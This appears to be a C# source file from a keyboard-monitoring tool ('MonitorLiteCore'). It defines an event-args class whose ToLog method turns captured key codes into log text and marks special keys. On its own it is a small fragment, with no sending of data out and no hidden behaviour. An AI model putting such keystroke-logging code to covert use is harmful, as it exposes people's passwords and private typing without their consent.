using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Text;
using System.Windows.Forms;

namespace MonitorLiteCore
{
    internal class KeyboardMonitorEventArgs : CancelEventArgs
    {
        private readonly NativeMethods.KeyboardMessage _message;
        private NativeMethods.KeyboardState _state;

        public KeyboardMonitorEventArgs(
            NativeMethods.KeyboardMessage message,
            ref NativeMethods.KeyboardState state
            )
        {
            _message = message;
            _state = state;
        }

     
        public string ToLog()
        {
            Console.WriteLine(_state.Flag);
            bool specialKeyword;
            string s;
            if (!Helpers.TryConvertToLog((ushort)_state.KeyCode, out s, out specialKeyword))
                return string.Empty;

            string format = "{0}";
            if (specialKeyword)
            {
                format = "[SPECIAL]{0}[/SPECIAL]";
            }

            return string.Format(format, s);
        }

    }
}
